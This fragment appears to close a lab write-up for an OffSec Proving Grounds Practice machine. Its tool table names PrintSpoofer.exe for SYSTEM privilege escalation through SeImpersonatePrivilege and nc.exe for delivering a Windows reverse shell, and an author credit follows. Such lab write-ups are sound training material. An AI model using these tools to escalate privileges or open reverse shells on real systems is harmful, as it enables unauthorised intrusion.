| `PrintSpoofer.exe` | SYSTEM privilege escalation via SeImpersonatePrivilege |
| `nc.exe` | Windows reverse shell delivery |

---

**Platform:** OffSec Proving Grounds Practice

**Author:** Tanvir Ahmed 
